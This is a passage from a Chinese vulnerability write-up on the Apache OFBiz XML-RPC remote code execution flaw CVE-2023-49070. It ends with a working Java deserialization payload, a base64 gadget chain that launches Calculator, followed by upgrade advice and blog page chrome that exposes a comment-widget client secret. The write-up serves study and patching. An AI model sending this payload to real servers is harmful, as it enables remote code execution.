class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span>rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqjK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyNDk3OTQ2MTA4NzQyNjI1AQAgTHlzb3NlcmlhbC9Qd25lcjQ5Nzk0NjEwODc0MjYyNTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABAAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA==<span class="tag">&lt;/<span class="name">serializable</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span><span class="tag">&lt;/<span class="name">struct</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span><span class="tag">&lt;/<span class="name">params</span>&gt;</span><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/burp.png"></p>
<h2 id="0x06-修复建议"><a href="#0x06-修复建议" class="headerlink" title="0x06 修复建议"></a>0x06 修复建议</h2><p>目前官方已发布新版本以修复这个安全问题，请通过如下链接下载安全版本：</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://ofbiz.apache.org/">https://ofbiz.apache.org/</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://0xf4n9x.github.io">_0xf4n9x_</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0xf4n9x.github.io/apache-ofbiz-cve-2023-49070-xmlrpc-rce.html">https://0xf4n9x.github.io/apache-ofbiz-cve-2023-49070-xmlrpc-rce.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。未经许可禁止转载到微信公众号，其他转载请注明来自 <a href="https://0xf4n9x.github.io" target="_blank">_0xf4n9x_'s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/cve/">cve</a><a class="post-meta__tags" href="/tags/java/">java</a><a class="post-meta__tags" href="/tags/rce/">rce</a></div><div class="post_share"><div class="social-share" data-image="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/burp.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/fortify-sca-v232-installation.html" title="Fortify SCA v23.2.0破解版安装小记"><img class="cover" src="/img/post/fortify-sca-v232-installation/scanned.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Fortify SCA v23.2.0破解版安装小记</div></div></a></div><div class="next-post pull-right"><a href="/smartbi-monitorservice-token-disclosure.html" title="Smartbi token泄漏致使任意登录漏洞"><img class="cover" src="/img/post/smartbi-monitorservice-token-disclosure/logged-in.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Smartbi token泄漏致使任意登录漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/cve-2021-44228-log4j2-jndi-attack.html" title="CVE-2021-44228 Log4j2 JNDI注入漏洞"><img class="cover" src="/img/post/cve-2021-44228-log4j2-jndi-attack/0.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-07</div><div class="title">CVE-2021-44228 Log4j2 JNDI注入漏洞</div></div></a></div><div><a href="/cve-2016-4437-apache-shiro-rce.html" title="CVE-2016-4437 SHIRO-550反序列化漏洞"><img class="cover" src="/img/post/cve-2016-4437-apache-shiro-rce/9.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-21</div><div class="title">CVE-2016-4437 SHIRO-550反序列化漏洞</div></div></a></div><div><a href="/cve-2023-32315-openfire-auth-bypass.html" title="CVE-2023-32315 Openfire管理控制台认证绕过漏洞分析"><img class="cover" src="/img/post/openfire-cve-2023-32315-auth-bypass/openfire.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-14</div><div class="title">CVE-2023-32315 Openfire管理控制台认证绕过漏洞分析</div></div></a></div><div><a href="/attacking-shiro-with-tomcat-memshell.html" title="利用Tomcat内存马攻击Shiro应用"><img class="cover" src="/img/post/attacking-shiro-with-tomcat-memshell/4.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-20</div><div class="title">利用Tomcat内存马攻击Shiro应用</div></div></a></div><div><a href="/apache-shiro-deserialization-exploitation.html" title="Apache Shiro各版本反序列化漏洞利用"><img class="cover" src="/img/post/apache-shiro-deserialization-exploitation/2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-22</div><div class="title">Apache Shiro各版本反序列化漏洞利用</div></div></a></div><div><a href="/attacking-shiro550-with-commons-collections.html" title="利用Commons Collections攻击Shiro550"><img class="cover" src="/img/post/attacking-shiro550-with-commons-collections/17.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">利用Commons Collections攻击Shiro550</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">0x00 漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">0x01 影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%8E%86%E5%8F%B2%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%9B%9E%E9%A1%BE"><span class="toc-text">0x02 历史相关漏洞修复回顾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xmlrpc%E9%89%B4%E6%9D%83"><span class="toc-text">xmlrpc鉴权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#serializable%E5%85%B3%E9%94%AE%E8%AF%8D%E6%A3%80%E6%B5%8B"><span class="toc-text">serializable关键词检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%BB%E9%99%A4XML-RPC"><span class="toc-text">移除XML-RPC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">0x03 漏洞环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x04 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">0x05 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">0x06 修复建议</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/burp.png')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By _0xf4n9x_</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '127fd27133c8e286cff8',
      clientSecret: 'f87b94b8813bcdae62b09baa633f85ef1a78107f',
      repo: '0xf4n9x.github.io',
      owner: '0xf4n9x',
      admin: ['0xf4n9x'],
      id: '69a951559c381b42c44e34e2a68fa2ed',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.textContent= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'G-YRH7DCY1TL', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>